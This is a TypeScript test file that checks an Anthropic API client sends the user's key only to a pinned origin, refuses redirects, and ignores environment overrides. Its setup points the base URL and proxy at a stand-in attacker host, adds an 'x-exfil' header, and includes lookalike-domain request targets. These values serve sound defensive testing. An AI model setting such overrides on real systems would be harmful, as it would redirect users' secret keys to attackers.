import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { createAnthropicProvider, PROVIDER_ORIGIN } from "./model-provider.js";
import * as modelProvider from "./model-provider.js";

// Issue #749: the BYOK invariant — the key reaches the configured provider and
// nothing else. The SDK reads ANTHROPIC_BASE_URL (and more) from the
// environment when it is not told otherwise, so the default client pins the
// origin, refuses any other host before a byte is sent, and never follows a
// redirect with the key attached.

const KEY = "sk-ant-secret-1234567890";

type Seen = { url: string; headers: Headers; redirect: unknown };

function recorder(): { fetch: typeof fetch; seen: Seen[] } {
  const seen: Seen[] = [];
  const fake = (input: Request | URL | string, init?: RequestInit) => {
    seen.push({
      url: input instanceof Request ? input.url : String(input),
      headers: new Headers(init?.headers),
      redirect: init?.redirect,
    });
    return Promise.resolve(
      new Response(JSON.stringify({ input_tokens: 3 }), {
        status: 200,
        headers: { "content-type": "application/json" },
      })
    );
  };
  return { fetch: fake, seen };
}

const count = (inner: typeof fetch) =>
  createAnthropicProvider(undefined, inner)
    .countTokens({ key: KEY, model: "m", text: "word" })
    .catch((error: unknown) => error as Error);

beforeEach(() => {
  vi.stubEnv("ANTHROPIC_BASE_URL", "https://evil.example");
  vi.stubEnv("ANTHROPIC_AUTH_TOKEN", "env-token");
  vi.stubEnv("ANTHROPIC_CUSTOM_HEADERS", "x-exfil: 1");
  vi.stubEnv("HTTPS_PROXY", "http://evil.example:8080");
});
afterEach(() => vi.unstubAllEnvs());

describe("the provider's egress", () => {
  it("goes to the pinned host whatever the environment says", async () => {
    const { fetch: inner, seen } = recorder();
    expect(await count(inner)).toBe(3);

    expect(seen).toHaveLength(1);
    expect(new URL(seen[0]!.url).origin).toBe(PROVIDER_ORIGIN);
    expect(seen[0]!.headers.get("x-api-key")).toBe(KEY);
    // An env-supplied token does not authenticate beside the key.
    expect(seen[0]!.headers.get("authorization")).toBeNull();
  });

  it("never follows a redirect, so the key cannot be forwarded", async () => {
    const { fetch: inner, seen } = recorder();
    await count(inner);
    expect(seen[0]!.redirect).toBe("error");
  });

  it("refuses a request to any other host before sending it", async () => {
    const { fetch: inner, seen } = recorder();
    const guarded = modelProvider.pinnedFetch(inner);
    await expect(
      guarded("https://evil.example/v1/messages", {
        headers: { "x-api-key": KEY },
      })
    ).rejects.toThrow(/refus/);
    await expect(
      guarded("https://api.anthropic.com.evil.example/v1/messages")
    ).rejects.toThrow(/refus/);
    await expect(
      guarded("http://api.anthropic.com/v1/messages")
    ).rejects.toThrow(/refus/);
    expect(seen).toHaveLength(0);
  });

  it("fails closed as a model failure, with no key in its words", async () => {
    const guarded = modelProvider.pinnedFetch(() =>
      Promise.reject(new Error("unreachable"))
    );
    const error = await createAnthropicProvider(undefined, guarded)
      .countTokens({ key: KEY, model: "m", text: "w" })
      .catch((e: unknown) => e as Error);
    expect(error).toMatchObject({ kind: "model" });
    expect(String((error as Error).message)).not.toContain(KEY);
  });
});
